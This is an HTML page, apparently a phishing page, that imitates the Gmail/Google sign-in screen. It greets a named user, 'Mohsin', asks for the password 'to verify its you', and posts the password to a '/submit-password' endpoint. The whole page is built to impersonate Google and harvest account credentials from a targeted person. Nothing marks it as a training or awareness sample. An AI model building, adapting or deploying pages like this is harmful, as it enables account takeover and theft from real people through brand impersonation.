<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }
    .container {
      text-align: center;
      width: 100%;
      max-width: 400px;
      padding: 24px;
      background: #fff;
      box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
      border-radius: 8px;
    }
    .google {
      margin-bottom: 20px;
      font-size: 2.5rem;
      font-weight: 400;
    }
    .tagline {
      font-size: 1.15rem;
      font-weight: 400;
      color: #202124;
      margin-bottom: 8px;
    }
    .signin {
      font-size: 0.875rem;
      color: #5f6368;
      margin-bottom: 24px;
    }
    .form img {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      margin-right: 8px;
      vertical-align: middle;
    }
    .input-wrapper {
      position: relative;
      width: 100%;
      margin-bottom: 16px;
    }
    .input {
      width: 100%;
      padding: 13px 40px 13px 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 1rem;
      color: #202124;
      background: #fff;
      outline: none;
      box-sizing: border-box;
    }
    .input:focus {
      border-color: #4285f4;
      box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
    }
    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
      width: 24px;
      height: 24px;
    }
    .toggle-password svg {
      width: 20px;
      height: 20px;
      fill: #5f6368;
    }
    .btn {
	  width: 20%;
      padding: 12px;
      background-color: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 0.875rem;
      font-weight: 500;
      cursor: pointer;
      text-decoration: none;
      display: block;
      margin-top: 25px;
    }
    .btn:hover {
      background-color: #1557b0;
    }
    .block {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 16px;
      font-size: 0.875rem;
    }
    .checkbox input {
      margin-right: 4px;
    }
    .help a {
      color: #1a73e8;
      text-decoration: none;
    }
    .help a:hover {
      text-decoration: underline;
    }
    @media (max-width: 480px) {
      .container {
        padding: 16px;
        max-width: 90%;
      }
      .google {
        font-size: 2rem;
      }
      .tagline {
        font-size: 1rem;
      }
      .signin {
        font-size: 0.75rem;
      }
      .form img {
        width: 24px;
        height: 24px;
      }
      .input {
        font-size: 0.875rem;
      }
      .btn {
        font-size: 0.75rem;
      }
      .block {
        font-size: 0.75rem;
     }
	.row{
	justify-content: space-between;
	align-items: center;
	margin:auto;
	}

    }
  </style>
</head>
<body>
  <div class="container">
    <p class="google">
      <span style="color: #4285F4">G</span><span style="color: #EA4335">o</span><span style="color: #FBBC05">o</span><span style="color: #4285F4">g</span><span style="color: #34A853">l</span><span style="color: #EA4335">e</span>
    </p>
    <p class="tagline">Hi Mohsin!</p>
		
    <p class="signin">First Enter your password to verify its you!</p>
    <form action="/submit-password" method="POST" class="form">
    
      
      <div class="input-wrapper">
        <input id="password" class="input" type="password" name="password" required placeholder="Password">
        <button type="button" class="toggle-password" aria-label="Show password">
          <!-- Eye icon -->
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 
                     7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 
                     12c-2.76 0-5-2.24-5-5s2.24-5 
                     5-5 5 2.24 5 5-2.24 5-5 
                     5zm0-8c-1.66 0-3 1.34-3 
                     3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
          </svg>
        </button>
      </div>
	<div class="row">
      <button type="submit" class="btn">Next</button>  <span style="color:blue;" class="forget">Forget Password?</span>
	</div>
      <div class="block">
        <div class="checkbox">
          <input type="checkbox">Stay signed in
        </div>
        <div class="help">
          <a href="#">Need help?</a>
        </div>
      </div>
    </form>
  </div>

  <script>
    const toggleBtn = document.querySelector('.toggle-password');
    const passwordInput = document.getElementById('password');

    toggleBtn.addEventListener('click', () => {
      const type = passwordInput.type === 'password' ? 'text' : 'password';
      passwordInput.type = type;
    });
  </script>
</body>
</html>
